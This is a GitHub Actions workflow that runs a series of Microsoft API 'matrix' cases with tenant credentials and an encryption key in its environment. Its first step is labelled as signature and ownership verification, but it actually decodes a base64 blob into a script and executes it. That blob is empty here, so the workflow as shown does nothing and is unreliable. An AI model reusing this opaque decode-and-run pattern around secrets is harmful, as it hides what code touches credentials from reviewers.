name: File Dock bounded API matrix
on:
  workflow_dispatch:
    inputs:
      bundle_envelope:
        type: string
        required: true
      initial_draft:
        type: string
        default: '1152921505702160582'
permissions:
  contents: read
concurrency:
  group: file-dock-store-recovery
  cancel-in-progress: false
jobs:
  matrix:
    runs-on: ubuntu-latest
    timeout-minutes: 75
    env:
      MS_TENANT_ID: ${{ secrets.MS_TENANT_ID }}
      MS_CLIENT_ID: ${{ secrets.MS_CLIENT_ID }}
      MS_CLIENT_SECRET: ${{ secrets.MS_CLIENT_SECRET }}
      STATE_ENCRYPTION_KEY: ${{ secrets.STATE_ENCRYPTION_KEY }}
      BUNDLE_ENVELOPE: ${{ inputs.bundle_envelope }}
      INITIAL_DRAFT: ${{ inputs.initial_draft }}
    steps:
      - name: Verify signed artifact and current ownership
        shell: node {0}
        run: |
          require('node:fs').writeFileSync('matrix.cjs',Buffer.from('','base64'));
          require('node:child_process').execFileSync(process.execPath,['matrix.cjs','init'],{stdio:'inherit'});
      - name: Case create-body
        if: ${{ env.FOUND_VALID != 'true' && env.ABORT_MATRIX != 'true' }}
        run: node matrix.cjs create-body
      - name: Case legacy-desktop
        if: ${{ env.FOUND_VALID != 'true' && env.ABORT_MATRIX != 'true' }}
        run: node matrix.cjs legacy-desktop
      - name: Case minimal-paid
        if: ${{ env.FOUND_VALID != 'true' && env.ABORT_MATRIX != 'true' }}
        run: node matrix.cjs minimal-paid
      - name: Case immediate-compatible
        if: ${{ env.FOUND_VALID != 'true' && env.ABORT_MATRIX != 'true' }}
        run: node matrix.cjs immediate-compatible
      - name: Summarize exact API outcomes
        if: always()
        run: |
          node matrix.cjs summary
          cat recovery-state.json >> "$GITHUB_STEP_SUMMARY"